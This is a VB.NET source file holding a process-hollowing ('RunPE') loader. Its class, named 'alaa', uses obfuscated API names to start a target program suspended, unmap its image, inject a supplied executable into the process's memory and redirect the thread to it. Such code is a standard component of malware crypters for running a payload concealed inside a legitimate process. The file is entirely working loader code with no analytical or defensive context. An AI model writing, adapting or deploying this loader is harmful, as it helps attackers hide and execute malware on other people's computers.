Imports System.Text
Imports System.Runtime.InteropServices

Public Class alaa
    Public Declare Function apii9 Lib "kernel32" Alias "LoadLibraryA" (ByVal name As String) As IntPtr
    Public Declare Function apii0 Lib "kernel32" Alias "GetProcAddress" (ByVal handle As IntPtr, ByVal name As String) As IntPtr
    Function CreateAPI(Of T)(ByVal name As String, ByVal method As String) As T
        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(apii0(apii9(name), method), GetType(T)), Object), T)
    End Function
    Delegate Function apii1(ByVal hThr As IntPtr, ByVal CNTXT As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function apii2(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As Integer
    Delegate Function apii3(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSS As Integer, ByRef numRead As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function apii4(ByVal hThread As IntPtr, ByVal SC As IntPtr) As Integer
    Delegate Function apii5(ByVal hThr As IntPtr, ByVal CNTXT As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function apii6(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal SS As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr
    Delegate Function apii7(ByVal hProcess As IntPtr, ByVal VABA As IntPtr, ByVal lpBuffer As Byte(), ByVal nSS As UInteger, ByVal NOBW As Integer) As Boolean
    Public Declare Auto Function apii8 Lib "kernel32" Alias "CreateProcessW" (ByVal appName As String, ByVal commandLine As StringBuilder, ByVal PTA As IntPtr, ByVal thrAttr As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal inherit As Boolean, ByVal creation As Integer, ByVal env As IntPtr, ByVal curDir As String, ByVal sInfo As Byte(), ByVal pInfo As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Function ReadPtr(ByVal lPtr As Long, Optional ByVal lSS As Long = &H4) As Integer
        Dim lRes As IntPtr
        Dim lBr As Integer
        Dim api4 As apii3 = CreateAPI(Of apii3)("ntdll", "NtReadVirtualMemory")
        Call api4(Process.GetCurrentProcess.Handle, lPtr, lRes, lSS, lBr)
        Return lRes
    End Function

    Public Function iExec(ByVal Buffbawa As Byte(), ByVal sExe As String) As Boolean
        Try
            Dim hGC As GCHandle = GCHandle.Alloc(Buffbawa, GCHandleType.Pinned) : Dim hModuleBase As Integer = hGC.AddrOfPinnedObject : hGC.Free()
            Dim PTA As IntPtr = IntPtr.Zero
            Dim tPI As IntPtr() = New IntPtr(3) {}
            Dim tSI As Byte() = New Byte(67) {}
            Dim N2 As Integer = BitConverter.ToInt32(Buffbawa, 60)
            Dim IB As Integer
            Dim CNTXT As UInteger() = New UInteger(178) {}
            CNTXT(0) = &H10002
            apii8(Nothing, New StringBuilder(sExe), PTA, PTA, False, 4, PTA, Nothing, tSI, tPI)
            Dim hPE As Integer = (hModuleBase + ReadPtr(hModuleBase + &H3C))
            IB = ReadPtr(hPE + &H34)
            Dim api3 As apii2 = CreateAPI(Of apii2)("ntdll", "NtUnmapViewOfSection")
            api3(tPI(0), IB)
            Dim api7 As apii6 = CreateAPI(Of apii6)("kernel32", "VirtualAllocEx")
            Dim VABA As IntPtr = api7(tPI(0), IB, ReadPtr(hPE + &H50), &H3000, &H40)
            Dim SA As New IntPtr(BitConverter.ToInt32(Buffbawa, N2 + &H34))
            Dim SS As New IntPtr(BitConverter.ToInt32(Buffbawa, N2 + 80))
            Dim WRET As Integer
            Dim NOBW As Integer
            Dim i As Integer
            Dim api8 As apii7 = CreateAPI(Of apii7)("ntdll", "NtWriteVirtualMemory")
            api8(tPI(0), VABA, Buffbawa, CUInt(CInt(ReadPtr(hPE + &H54))), WRET)
            For i = 0 To ReadPtr(hPE + &H6, 2) - 1
                Dim Destination As Integer() = New Integer(9) {}
                Buffer.BlockCopy(Buffbawa, (N2 + &HF8) + (i * 40), Destination, 0, 40)
                Dim B2 As Byte() = New Byte((Destination(4) - 1)) {}
                Buffer.BlockCopy(Buffbawa, Destination(5), B2, 0, B2.Length)
                SS = New IntPtr(VABA.ToInt32() + Destination(3))
                SA = New IntPtr(B2.Length)
                api8(tPI(0), SS, B2, CUInt(SA), NOBW)
            Next i
            Dim api2 As apii1 = CreateAPI(Of apii1)("ntdll", "NtGetContextThread")
            api2(tPI(1), CNTXT)
            api8(tPI(0), CNTXT(41) + &H8, BitConverter.GetBytes(VABA.ToInt32()), CUInt(&H4), NOBW)
            CNTXT(&H2C) = IB + ReadPtr(hPE + &H28)
            Dim api6 As apii5 = CreateAPI(Of apii5)("ntdll", "NtSetContextThread")
            api6(tPI(1), CNTXT)
            Dim api5 As apii4 = CreateAPI(Of apii4)("ntdll", "NtResumeThread")
            api5(tPI(1), 0)
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function
End Class